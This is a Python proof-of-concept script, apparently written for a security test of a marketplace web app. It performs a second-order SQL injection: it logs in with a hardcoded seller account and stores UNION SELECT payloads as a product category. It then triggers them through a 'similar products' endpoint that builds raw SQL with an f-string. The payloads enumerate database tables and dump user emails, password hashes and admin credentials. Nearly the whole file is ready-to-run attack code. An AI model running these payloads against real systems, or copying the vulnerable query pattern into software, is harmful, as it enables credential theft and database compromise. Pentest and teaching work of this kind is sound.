#!/usr/bin/env python3
"""
SQLI-2 — Second-Order SQL Injection via Product Category
Endpoint : POST /api/products         (store payload — safe ORM insert)
           GET  /api/products/{id}/similar  (trigger — unsafe raw SQL)
Auth     : Seller to store; any user to trigger

Two-phase attack:

  Phase 1 — Store:
    Seller creates a product whose `category` field contains a SQL injection
    payload. The backend stores it via SQLAlchemy ORM — parameterized, safe.
    The malicious string sits dormant in the database.

  Phase 2 — Trigger:
    Any user calls GET /api/products/{id}/similar.
    The endpoint retrieves the product via ORM (safe), then builds a raw SQL
    query by interpolating product.category directly into an f-string:

        f"...WHERE is_active = 1 AND category = '{product.category}' AND id != {product_id}..."

    The stored payload is now part of the SQL string. The injection fires.

Payload examples
----------------
  Enumerate tables:
    ' UNION SELECT 1,name,sql,4,5,6,7 FROM sqlite_master WHERE type='table'--

  Dump all user credentials:
    ' UNION SELECT id,email,hashed_password,0,0,'users',0 FROM users--

  Dump admin specifically:
    ' UNION SELECT id,email,hashed_password,0,0,role,0 FROM users WHERE email='admin@mercury.com'--

Usage
-----
    python poc_017_second_order_sqli.py
    python poc_017_second_order_sqli.py --url http://localhost:8000
    python poc_017_second_order_sqli.py --payload "' UNION SELECT id,email,hashed_password,0,0,'users',0 FROM users--"
"""

import argparse
import sys
import requests

SELLER_EMAIL    = "alice@mercury.com"
SELLER_PASSWORD = "Seller123!"

DUMP_USERS  = "' UNION SELECT id,email,hashed_password,0,0,'users',0 FROM users--"
ENUM_TABLES = "' UNION SELECT 1,name,sql,4,5,6,7 FROM sqlite_master WHERE type='table'--"
DUMP_ADMIN  = "' UNION SELECT id,email,hashed_password,0,0,role,0 FROM users WHERE email='admin@mercury.com'--"


def banner():
    print("=" * 60)
    print("  SQLI-2 — Second-Order SQLi via Product Category")
    print("  Store: POST /api/products  (ORM — safe)")
    print("  Trigger: GET /api/products/{id}/similar  (raw SQL — unsafe)")
    print("=" * 60)


def login(base_url, email, password):
    resp = requests.post(f"{base_url}/api/auth/login",
                         json={"email": email, "password": password}, timeout=10)
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print("[-] Login failed"); sys.exit(1)
    return token


def store_payload(base_url, token, payload):
    """Phase 1 — store via ORM (no injection here)."""
    resp = requests.post(
        f"{base_url}/api/products",
        headers={"Authorization": f"Bearer {token}"},
        json={
            "title": "Similar Products Demo",
            "description": "Testing similar product recommendations.",
            "price": 9.99,
            "quantity": 1,
            "category": payload,   # malicious value stored safely by ORM
        },
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()["id"]


def trigger(base_url, product_id):
    """Phase 2 — retrieve product.category from DB, inject into raw SQL."""
    resp = requests.get(f"{base_url}/api/products/{product_id}/similar", timeout=10)
    if resp.status_code == 200:
        return resp.json()
    print(f"[-] {resp.status_code}: {resp.text[:300]}")
    return []


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8000")
    parser.add_argument("--payload", default=None,
                        help="SQLi payload to store as product category (default: runs full demo)")
    args = parser.parse_args()

    banner()
    print(f"[*] Target: {args.url}")

    token = login(args.url, SELLER_EMAIL, SELLER_PASSWORD)
    print(f"[+] Authenticated as {SELLER_EMAIL}")

    payloads = [(args.payload, "Custom payload")] if args.payload else [
        (ENUM_TABLES, "Step 1 — Enumerate tables via sqlite_master"),
        (DUMP_USERS,  "Step 2 — Dump all user emails + password hashes"),
        (DUMP_ADMIN,  "Step 3 — Dump admin credentials specifically"),
    ]

    for payload, label in payloads:
        print(f"\n[*] {label}")
        print(f"    Storing payload as product category...")
        product_id = store_payload(args.url, token, payload)
        print(f"    Product id={product_id} stored via ORM (no injection yet)")

        print(f"    Triggering via GET /api/products/{product_id}/similar ...")
        rows = trigger(args.url, product_id)
        if rows:
            print(f"    Results ({len(rows)} rows injected):")
            for r in rows:
                print(f"      id={r.get('id')}  title={r.get('title')!r}  "
                      f"description={r.get('description')!r}  category={r.get('category')!r}")
        else:
            print("    No rows returned")

    print("\n[+] Done.")


if __name__ == "__main__":
    main()
